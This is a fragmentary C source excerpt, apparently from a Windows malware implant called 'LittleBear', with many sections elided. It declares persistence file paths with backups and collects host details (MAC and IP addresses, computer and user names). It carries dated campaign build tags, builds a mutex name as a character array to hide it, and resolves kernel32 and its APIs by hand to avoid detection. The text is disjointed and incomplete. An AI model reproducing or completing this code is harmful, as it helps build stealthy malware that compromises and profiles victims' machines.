...
char strBakPEResidence[MAX_PATH]	= {0};
char strPEResidence[MAX_PATH]		= {0};
char strBakDllResidence[MAX_PATH]	= {0};
char strDllResidence[MAX_PATH]		= {0};
char strLocalMac[32]				= {0};
unsigned char cMAC[6]				= {0};
char strGateWayMac[32]				= {0};
char strLocalIP[32]					= {0};
char strLocalExternalIP[MAX_PATH]	= {0};
...
char strComputerName[MAX_PATH]		= {0};
char strUserName[MAX_PATH]			= {0};
...
//char gUserName[] = "test20181205";
//char gUserName[] = "test20181214";
//char gUserName[] = "test20181216";
//char gUserName[] = "test20190220";
//char gUserName[] = "test20190319";
//char gUserName[] = "test20190326";
//char gUserName[] = "test20190330";
//char gUserName[] = "test20190331";
//char gUserName[] = "test20190402";
//char gUserName[] = "test20190410";
//char gUserName[] = "test20190413";
//char gUserName[] = "test20190424";
//char gUserName[] = "test20190521";
//char gUserName[] = "test20190528";
//char gUserName[] = "test20190629";
//char gUserName[] = "test20190701";
//char gUserName[] = "test20190716";
//char gUserName[] = "test20190729";
//char gUserName[] = "test20190805";
//char gUserName[] = "test20190830";
//char gUserName[] = "test20191012";

//char gUserName[] = "setup20190726";
//char gUserName[] = "down20190722";
//char gUserName[] = "setuppc20190410";
//char gUserName[] = "setup20200106";
char gUserName[64] = "jy20200611";

char LITTLEBEAR_MUTEX_NAME[]			={'L','I','T','T','L','E','B','E','A','R','_','M','U','T','E','X',0};
...
int WriteLittleBearRawLog(char * pLog)
{
...
int WriteLittleBearLog(char * pLog)
{
	char strFilePath[MAX_PATH] = {0};
	int iRet = ModifyModuleFileName(strFilePath,LITTLEBEAR_LOG_FILE_NAME);
...
int ModifyModuleFileName(char * strModuleFileName,char * strName)
{
...
#ifdef _WIN64
	iProgramX86X64Value = 64;
#else
	iProgramX86X64Value = 32;
#endif 

	lpDllKernel32 = (HMODULE)GetDllKernel32Base();
	if (lpDllKernel32 == 0)
	{
		//WriteLittleBearLog("_GetApi GetDllKernel32Base error\r\n");
		return FALSE;
	}
...
// 	lpGetVersionExA = (ptrGetVersionExA)lpGetProcAddress(lpDllKernel32,szGetVersionExA);
	...
	lpOpenProcessToken = (ptrOpenProcessToken)lpGetProcAddress(lpDllKernel32,szOpenProcessToken);
...
{
	for ( int i = 0; i < (int)lplstrlenA(szName); i ++)
	{
		if (szName[i] == '.')
		{
			*(szMainName + i) = 0;
